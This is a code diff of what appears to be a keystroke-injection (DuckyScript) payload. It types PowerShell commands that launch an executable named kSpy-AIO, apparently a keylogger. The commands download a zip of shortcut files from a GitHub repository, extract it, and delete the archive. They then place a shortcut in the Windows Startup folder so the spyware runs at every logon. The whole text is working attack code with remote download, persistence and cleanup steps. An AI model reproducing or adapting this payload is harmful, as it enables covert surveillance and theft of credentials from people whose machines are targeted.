@@ -29,11 +29,19 @@ STRING Start-Process 'C:\winx32\kSpy-AIO_v1.2.exe'
 DELAY 500
 ENTER
 DELAY 10000
-STRING (New-Object System.Net.WebClient).DownloadFile('https://github.com/3rr0r-505/KeySpy/raw/main/exe/.lnk/kSpy-AIO_v1.2-Srt.lnk', 'C:\winx32\kSpy-AIO_v1.2-Srt.lnk')
+STRING (New-Object System.Net.WebClient).DownloadFile('https://github.com/3rr0r-505/KeySpy/raw/main/exe/.lnk/kSpy-srt.zip', 'C:\winx32\kSpy-srt.zip')
+DELAY 500
+ENTER
+DELAY 10000
+STRING Expand-Archive -Path 'C:\winx32\kSpy-srt.zip' -DestinationPath 'C:\winx32\kSpy-srt'
 DELAY 500
 ENTER
 DELAY 1000
-STRING move-item -Path 'C:\winx32\kSpy-AIO_v1.2-Srt.lnk' -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\kSpy-AIO_v1.2-Srt.lnk"
+STRING Remove-Item 'C:\winx32\kSpy-srt.zip' -Force
+DELAY 500
+ENTER
+DELAY 1000
+STRING move-item -Path 'C:\winx32\kSpy-srt\kSpy-AIO_v1.2 - Shortcut.lnk' -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\kSpy-AIO_v1.2-Srt.lnk"
 DELAY 500
 ENTER
 DELAY 1000
@@ -42,4 +50,3 @@ DELAY 500
 ENTER
 DELAY 1000
 ALT F4
-
